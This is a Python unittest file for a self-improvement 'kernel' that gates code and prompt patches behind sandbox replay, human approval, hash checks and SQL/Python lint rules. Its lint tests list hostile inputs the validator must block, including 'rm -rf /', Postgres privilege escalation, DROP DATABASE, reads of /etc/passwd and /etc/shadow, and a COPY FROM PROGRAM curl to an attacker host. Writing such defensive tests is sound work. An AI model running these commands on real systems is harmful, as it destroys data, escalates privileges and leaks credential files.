import os
import tempfile
import threading
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

from closed_loop_kernel import KernelEngine, KernelStore, SecurityError
from tests.postgres_test_utils import build_postgres_store


class ClosedLoopKernelTests(unittest.TestCase):
    def setUp(self):
        self.store = build_postgres_store()
        self.addCleanup(self.store.close)
        self.engine = KernelEngine(self.store)

    def test_failed_attempt_is_single_insert_and_append_only(self):
        attempt_id = self.engine.start_attempt({"query": "raise TypeError"})

        self.assertEqual(self.store.fetch_all("SELECT * FROM attempts WHERE id = ?", [attempt_id]), [])
        lifecycle_states = [
            row["state"]
            for row in self.store.fetch_all(
                "SELECT state FROM attempt_lifecycle_events WHERE attempt_id = ? ORDER BY created_at",
                [attempt_id],
            )
        ]
        self.assertEqual(lifecycle_states, ["started", "running"])

        self.engine.finish_attempt(
            attempt_id,
            status="failed",
            input_payload={"query": "raise TypeError"},
            error_message="TypeError: unsupported operand type",
            tool_calls=[
                {"tool_name": "query_database", "arguments": {"sql": "SELECT broken"}, "status": "failed"}
            ],
            decisions=[
                {"decision_maker": "policy_engine", "action_taken": "allowed", "reason": "read-only query"}
            ],
        )

        attempts = self.store.fetch_all("SELECT * FROM attempts WHERE id = ?", [attempt_id])
        self.assertEqual(len(attempts), 1)
        self.assertEqual(attempts[0]["status"], "failed")
        self.assertIn("TypeError", attempts[0]["error_message"])
        self.assertEqual(
            self.store.scalar("SELECT COUNT(*) FROM failures WHERE attempt_id = ?", [attempt_id]),
            1,
        )

        with self.assertRaisesRegex(Exception, "attempts is append-only"):
            self.store.execute("UPDATE attempts SET status = 'success' WHERE id = ?", [attempt_id])

    def test_candidate_apply_requires_replay_approval_and_matching_artifact_hash(self):
        artifact_id = self.engine.create_artifact("skills.compute_score", "python", "def compute(): return 1")
        attempt_id = self.engine.start_attempt({"skill": "compute_score"})
        self.engine.finish_attempt(
            attempt_id,
            status="failed",
            input_payload={"skill": "compute_score"},
            error_message="TypeError: None cannot be added",
        )
        failure_id = self.store.scalar("SELECT id FROM failures WHERE attempt_id = ?", [attempt_id])

        candidate_id = self.engine.propose_improvement(
            failure_id,
            target_artifact_id=artifact_id,
            patch_type="code_patch",
            proposed_content="def compute(): return 2",
            validation_assertions={"unit": "compute_returns_number"},
            rollback_plan={"restore_artifact_id": artifact_id},
        )

        with self.assertRaisesRegex(Exception, "sandbox_verified"):
            self.engine.apply_candidate(candidate_id)

        self.engine.record_replay(candidate_id, status="success", validation_results={"unit": "passed"})
        self.engine.approve_candidate(candidate_id, approved_by="human_dri:gary", comments="sandbox passed")
        new_artifact_id = self.engine.apply_candidate(candidate_id)

        active = self.store.fetch_one(
            "SELECT * FROM artifacts WHERE name = ? AND is_active = TRUE",
            ["skills.compute_score"],
        )
        self.assertEqual(active["id"], new_artifact_id)
        self.assertEqual(active["content"], "def compute(): return 2")
        self.assertEqual(self.store.scalar("SELECT status FROM improvement_candidates WHERE id = ?", [candidate_id]), "applied")
        self.assertEqual(self.store.scalar("SELECT status FROM failures WHERE id = ?", [failure_id]), "resolved")

    def test_register_python_pattern_replaces_active_route_and_preserves_history(self):
        pattern_signature = "intent=availability+entities_schema=tour_name,month"
        first_artifact_id = self.engine.create_artifact("skills.query_intent.availability", "python", "def handle(): return 1")
        second_artifact_id = self.engine.create_artifact("skills.query_intent.availability", "python", "def handle(): return 2")

        first_route_id = self.engine.register_python_pattern(pattern_signature, first_artifact_id)
        second_route_id = self.engine.register_python_pattern(pattern_signature, second_artifact_id)

        self.assertNotEqual(first_route_id, second_route_id)
        route = self.engine.lookup_python_route(pattern_signature)
        self.assertEqual(
            route,
            {
                "route_id": second_route_id,
                "artifact_id": second_artifact_id,
                "artifact_name": "skills.query_intent.availability",
            },
        )
        self.assertEqual(
            self.store.scalar(
                "SELECT COUNT(*) FROM pattern_routes WHERE pattern_signature = ? AND is_active = TRUE",
                [pattern_signature],
            ),
            1,
        )
        self.assertEqual(
            self.store.scalar(
                "SELECT COUNT(*) FROM pattern_routes WHERE pattern_signature = ? AND is_active = FALSE",
                [pattern_signature],
            ),
            1,
        )
        self.assertEqual(
            self.store.scalar("SELECT COUNT(*) FROM events WHERE event_type = 'python_pattern_registered'"),
            2,
        )

    def test_register_python_pattern_rejects_inactive_artifact(self):
        artifact_id = self.engine.create_artifact("skills.inactive", "python", "def handle(): return 1")
        self.store.execute("UPDATE artifacts SET is_active = FALSE WHERE id = ?", [artifact_id])

        with self.assertRaisesRegex(ValueError, "is not active"):
            self.engine.register_python_pattern("intent=availability", artifact_id)

    def test_artifact_hash_mismatch_blocks_apply_and_keeps_candidate_draft(self):
        artifact_id = self.engine.create_artifact("prompts.search", "prompt", "v1")
        failure_id = self.engine.create_failure_for_test("logic_fault")
        candidate_id = self.engine.propose_improvement(
            failure_id,
            target_artifact_id=artifact_id,
            patch_type="prompt_update",
            proposed_content="v2",
            validation_assertions={"replay": "ok"},
            rollback_plan={"restore": "v1"},
        )
        self.engine.record_replay(candidate_id, status="success", validation_results={"replay": "ok"})
        self.engine.approve_candidate(candidate_id, approved_by="human_dri:gary", comments="ok")
        self.engine.force_replace_active_artifact_for_test("prompts.search", "prompt", "concurrent-v2")

        with self.assertRaisesRegex(Exception, "Artifact has changed"):
            self.engine.apply_candidate(candidate_id)

        self.assertEqual(self.store.scalar("SELECT status FROM improvement_candidates WHERE id = ?", [candidate_id]), "draft")
        self.assertEqual(
            self.store.scalar("SELECT content FROM artifacts WHERE name = ? AND is_active = TRUE", ["prompts.search"]),
            "concurrent-v2",
        )

    def test_concurrent_apply_against_same_artifact_serializes_via_row_lock(self):
        # ISSUE-002 緩解驗證：兩個候選都針對同一個 active artifact（base hash 一樣），
        # 兩條獨立連線在分開 thread 同時 apply。FOR UPDATE row-lock 應該讓他們序列化：
        # 一個贏（artifact 推進到 v2）、一個輸（candidate 被退回 draft 並回報 race）。
        if not os.environ.get("KERNEL_DATABASE_URL"):
            raise unittest.SkipTest("KERNEL_DATABASE_URL is required")

        artifact_id = self.engine.create_artifact("shared.prompt", "prompt", "v1")
        failure_a = self.engine.create_failure_for_test("first")
        failure_b = self.engine.create_failure_for_test("second")
        candidate_a = self.engine.propose_improvement(
            failure_a, artifact_id, "prompt_update", "v2-A",
            {"replay": "ok"}, {"restore_artifact_id": artifact_id},
        )
        candidate_b = self.engine.propose_improvement(
            failure_b, artifact_id, "prompt_update", "v2-B",
            {"replay": "ok"}, {"restore_artifact_id": artifact_id},
        )
        for cid in (candidate_a, candidate_b):
            self.engine.record_replay(cid, "success", {"replay": "ok"})
            self.engine.approve_candidate(cid, "human_dri:gary", "concurrent test")

        # 為了真正並發，各 thread 使用自己的 KernelStore（獨立 psycopg 連線）
        # 而不是共用 self.store（其 RLock 會把他們強制序列化在 Python 層）
        url = os.environ["KERNEL_DATABASE_URL"]
        outcomes: dict[str, BaseException | str] = {}
        outcomes_lock = threading.Lock()
        barrier = threading.Barrier(2)

        def worker(label: str, candidate_id: str) -> None:
            local_store = KernelStore.from_url(url)
            local_engine = KernelEngine(local_store)
            try:
                barrier.wait(timeout=5)  # 兩個 thread 一起進 apply
                new_id = local_engine.apply_candidate(candidate_id)
                with outcomes_lock:
                    outcomes[label] = ("success", new_id)
            except BaseException as exc:
                with outcomes_lock:
                    outcomes[label] = ("error", exc)
            finally:
                local_store.close()

        t1 = threading.Thread(target=worker, args=("A", candidate_a))
        t2 = threading.Thread(target=worker, args=("B", candidate_b))
        t1.start(); t2.start(); t1.join(timeout=10); t2.join(timeout=10)

        statuses = sorted([outcomes["A"][0], outcomes["B"][0]])
        self.assertEqual(statuses, ["error", "success"], f"unexpected outcomes: {outcomes!r}")

        # 確認 race error 訊息與 candidate 狀態
        loser_label = "A" if outcomes["A"][0] == "error" else "B"
        loser_exc = outcomes[loser_label][1]
        self.assertIn("Race condition", str(loser_exc))
        loser_candidate = candidate_a if loser_label == "A" else candidate_b
        self.assertEqual(
            self.store.scalar("SELECT status FROM improvement_candidates WHERE id = ?", [loser_candidate]),
            "draft",
        )

        # 贏家寫了 v2；artifact 表現在應該有兩個版本，is_active 在 v2
        active = self.store.fetch_one(
            "SELECT version, content FROM artifacts WHERE name = ? AND is_active = TRUE",
            ["shared.prompt"],
        )
        self.assertEqual(active["version"], 2)
        self.assertIn("v2-", active["content"])

    def test_orphan_lifecycle_is_reconciled_as_failed_attempt(self):
        attempt_id = self.engine.generate_id()
        old = datetime.now(timezone.utc) - timedelta(minutes=6)
        self.engine.record_lifecycle_event(attempt_id, "started", created_at=old)
        self.engine.record_lifecycle_event(attempt_id, "running", created_at=old + timedelta(seconds=30))

        self.assertEqual(len(self.engine.find_orphan_attempts(older_than_seconds=300)), 1)
        reconciled = self.engine.reconcile_orphan_attempts(older_than_seconds=300)

        self.assertEqual(reconciled, [attempt_id])
        attempt = self.store.fetch_one("SELECT * FROM attempts WHERE id = ?", [attempt_id])
        self.assertEqual(attempt["status"], "failed")
        self.assertIn("Orphan attempt detected", attempt["error_message"])
        self.assertEqual(
            self.store.scalar(
                "SELECT state FROM attempt_lifecycle_events WHERE attempt_id = ? ORDER BY created_at DESC LIMIT 1",
                [attempt_id],
            ),
            "finished",
        )


class SandboxLintTests(unittest.TestCase):
    def test_sql_and_python_lints_block_known_unsafe_patches(self):
        store = build_postgres_store()
        self.addCleanup(store.close)
        engine = KernelEngine(store)

        with self.assertRaisesRegex(SecurityError, "SQL Lint Blocked"):
            engine.validate_sql_patch("DROP TABLE public.attempts;")

        with self.assertRaisesRegex(SecurityError, "Python AST Lint Blocked"):
            engine.validate_python_patch("import os\nos.system('rm -rf /')")

    def test_sql_and_python_lints_allow_minimal_safe_patches(self):
        store = build_postgres_store()
        self.addCleanup(store.close)
        engine = KernelEngine(store)

        engine.validate_sql_patch("CREATE INDEX idx_documents_title ON documents(title);")
        engine.validate_python_patch("def normalize(value):\n    return value or 0\n")

    def test_sql_lint_blocks_role_and_privilege_escape_attempts(self):
        store = build_postgres_store()
        self.addCleanup(store.close)
        engine = KernelEngine(store)

        # 角色 / 授權切換 — 一旦放行，sandbox_runner 的權限隔離就失效
        forbidden_role_escapes = [
            "RESET ROLE;",
            "SET ROLE postgres;",
            "SET SESSION AUTHORIZATION postgres;",
            "RESET SESSION AUTHORIZATION;",
            "CREATE FUNCTION evil() RETURNS void LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$;",
            "CREATE ROLE attacker;",
            "ALTER ROLE sandbox_runner SUPERUSER;",
            "DROP ROLE sandbox_runner;",
            "CREATE USER attacker;",
            "GRANT SELECT ON documents TO attacker;",
            "REVOKE SELECT ON documents FROM sandbox_runner;",
        ]
        for sql in forbidden_role_escapes:
            with self.assertRaisesRegex(SecurityError, "SQL Lint Blocked", msg=f"should block: {sql!r}"):
                engine.validate_sql_patch(sql)

    def test_sql_lint_blocks_schema_database_and_alter_system_destruction(self):
        store = build_postgres_store()
        self.addCleanup(store.close)
        engine = KernelEngine(store)

        forbidden_destruction = [
            "DROP SCHEMA sandbox_temp_xxx CASCADE;",
            "DROP DATABASE clk_test;",
            "ALTER SYSTEM SET shared_buffers = '1MB';",
        ]
        for sql in forbidden_destruction:
            with self.assertRaisesRegex(SecurityError, "SQL Lint Blocked", msg=f"should block: {sql!r}"):
                engine.validate_sql_patch(sql)

    def test_sql_lint_blocks_filesystem_and_copy_paths(self):
        store = build_postgres_store()
        self.addCleanup(store.close)
        engine = KernelEngine(store)

        forbidden_fs = [
            "COPY documents FROM '/etc/passwd';",
            "COPY documents TO '/tmp/leak.csv';",
            "COPY documents FROM PROGRAM 'curl http://attacker/' WITH CSV;",
            "SELECT pg_read_file('/etc/passwd');",
            "SELECT pg_read_binary_file('/etc/shadow');",
            "SELECT pg_ls_dir('/');",
            "SELECT lo_import('/etc/passwd');",
            "SELECT lo_export(123, '/tmp/leak');",
        ]
        for sql in forbidden_fs:
            with self.assertRaisesRegex(SecurityError, "SQL Lint Blocked", msg=f"should block: {sql!r}"):
                engine.validate_sql_patch(sql)


if __name__ == "__main__":
    unittest.main()
